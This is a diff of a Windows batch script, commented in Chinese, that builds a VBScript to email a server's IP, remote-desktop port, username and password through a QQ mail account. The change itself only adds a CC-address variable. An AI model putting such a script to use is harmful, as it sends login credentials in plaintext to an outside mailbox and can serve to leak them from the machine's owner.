@@ -6,6 +6,8 @@ set qquser=
 set qqauth=
 ::接受邮件的qq邮箱
 set revqq=
+::添加抄送邮箱
+set revqqcc=
 ::=======================================================================================
 ::判断能否联网
 ping -n 2 www.baidu.com >nul 2>nul
@@ -43,7 +45,7 @@ echo NameSpace = "http://schemas.microsoft.com/cdo/configuration/" >mail.vbs
 echo Set Email = CreateObject("CDO.Message") >>mail.vbs
 echo Email.From = "%qquser%" >>mail.vbs
 echo Email.To = "%revqq%" >>mail.vbs
-::echo Email.CC = "抄送邮箱@qq.com" >>mail.vbs
+::echo Email.CC = "%revqqcc%" >>mail.vbs
 echo Email.Subject = "%ip% 帐号密码，远程端口" >>mail.vbs
 echo Email.HTMLbody = "服务器: %ip%:%port%<br>帐号: %username%<br>密码: %password%" >>mail.vbs
 ::echo Email.Textbody = "服务器%ip%:%port%    帐号%username%   密码%password%" >>mail.vbs
